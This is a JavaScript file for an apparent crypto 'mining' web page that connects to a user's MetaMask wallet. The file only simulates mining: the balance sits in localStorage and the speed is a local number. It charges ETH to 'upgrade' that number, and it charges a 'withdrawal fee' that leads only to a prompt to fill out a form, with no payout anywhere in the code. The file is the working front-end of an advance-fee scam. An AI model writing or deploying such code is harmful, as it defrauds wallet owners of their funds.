document.addEventListener('DOMContentLoaded', async function() {
    const connectWalletBtn = document.getElementById('connectWallet');
    const upgradeSpeedBtn = document.getElementById('upgradeSpeed');
    const withdrawBtn = document.getElementById('withdrawTokens');
    const walletAddressDisplay = document.getElementById('walletAddress');
    const ethBalanceDisplay = document.getElementById('ethBalance');

    let miningSpeed = 0.05; 
    let balance = parseFloat(localStorage.getItem('miningBalance')) || 0;
    let walletAddress = '';

    if (typeof window.ethereum !== 'undefined') {
        const web3 = new Web3(window.ethereum);

        // Connect Wallet
        connectWalletBtn.addEventListener('click', async () => {
            try {
                const accounts = await ethereum.request({ method: 'eth_requestAccounts' });
                walletAddress = accounts[0];
                walletAddressDisplay.textContent = walletAddress;

                const ethBalance = await web3.eth.getBalance(walletAddress);
                ethBalanceDisplay.textContent = web3.utils.fromWei(ethBalance, 'ether') + ' ETH';
            } catch (error) {
                console.error(error);
            }
        });

        // Mining Speed Upgrade with ETH Payment
        upgradeSpeedBtn.addEventListener('click', async () => {
            if (!walletAddress) {
                alert("Connect your wallet first!");
                return;
            }
            
            try {
                const transactionParameters = {
                    to: 'SMART_CONTRACT_ADDRESS_HERE', 
                    from: walletAddress,
                    value: web3.utils.toWei('0.0009', 'ether'),
                };
                
                await ethereum.request({ method: 'eth_sendTransaction', params: [transactionParameters] });
                miningSpeed *= 2; 
                document.getElementById('paymentStatus').textContent = "Mining speed upgraded!";
            } catch (error) {
                document.getElementById('paymentStatus').textContent = "Payment failed!";
            }
        });

        // Withdraw Function with ETH Fee
        withdrawBtn.addEventListener('click', async () => {
            if (!walletAddress) {
                alert("Connect your wallet first!");
                return;
            }

            if (balance < 100000) {
                alert("Minimum withdrawal is 100,000 tokens.");
                return;
            }

            try {
                const transactionParameters = {
                    to: 'SMART_CONTRACT_ADDRESS_HERE', 
                    from: walletAddress,
                    value: web3.utils.toWei('0.009', 'ether'),
                };
                
                await ethereum.request({ method: 'eth_sendTransaction', params: [transactionParameters] });
                alert("Withdrawal fee paid! Now fill out the withdrawal form.");
            } catch (error) {
                alert("Payment failed!");
            }
        });
    } else {
        alert("Please install MetaMask to use this feature.");
    }
});
